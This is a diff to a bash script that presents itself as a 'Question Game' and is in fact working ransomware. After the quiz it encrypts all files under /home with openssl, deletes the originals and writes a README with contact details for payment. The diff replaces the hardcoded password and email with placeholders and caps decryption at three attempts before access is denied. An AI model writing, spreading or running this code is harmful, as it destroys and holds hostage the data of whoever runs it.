@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# Prompt the user with a question game
+# Welcome the user with a question game
 echo "Welcome to the Question Game!"
 echo "Answer the following question to proceed."
 echo
@@ -22,8 +22,7 @@ echo "Correct! Access granted. Please wait for the next game. It takes 5 minutes
 
 # Continue with file encryption
 folder_to_encrypt="/home"
-password="hydradragonantivirushere"
-script_to_exclude="mygame.sh"
+password="yourhydraantiviruspasswordhere"
 
 if [ ! -d "$folder_to_encrypt" ]; then
     echo "The specified folder does not exist."
@@ -34,8 +33,8 @@ fi
 encrypt_files() {
     local file="$1"
     
-    # Check if the file is the script to exclude
-    if [ "$file" != "$script_to_exclude" ]; then
+    # Check if the file is already encrypted
+    if [[ ! "$file" == *".enc" ]]; then
         # Encrypt the file using AES-256-CBC encryption
         openssl enc -aes-256-cbc -in "$file" -out "$file.enc" -pass "pass:$password" > /dev/null 2>&1
         # Remove the original file, suppressing errors
@@ -51,10 +50,12 @@ echo "All files have been encrypted, and unencrypted files have been deleted."
 
 # Create a README.md file with contact details
 echo "Contact Information:" > README.md
-echo "Email: semaemirhan555@gmail.com" >> README.md
+echo "Email: your@email.com" >> README.md
 
 # Loop for decryption with password verification
-while true; do
+max_attempts=3
+attempts=0
+while [ $attempts -lt $max_attempts ]; do
     # Prompt the user for the decryption password
     read -s -p "Enter the decryption password: " decryption_password
     echo
@@ -81,6 +82,18 @@ while true; do
     export -f decrypt_files
 
     find "$folder_to_encrypt" -type f -name "*.enc" -print0 | xargs -0 -n 1 -P $(nproc) bash -c 'decrypt_files "$0"'
+    
+    # Check if decryption was successful
+    if [ $? -eq 0 ]; then
+        break  # Exit the loop if successful
+    fi
+    
+    # Increment the attempts
+    attempts=$((attempts + 1))
 done
 
-echo "All files have been decrypted, and encrypted files have been deleted."
+if [ $attempts -eq $max_attempts ]; then
+    echo "Maximum number of attempts reached. Access denied."
+else
+    echo "All files have been decrypted, and encrypted files have been deleted."
+fi
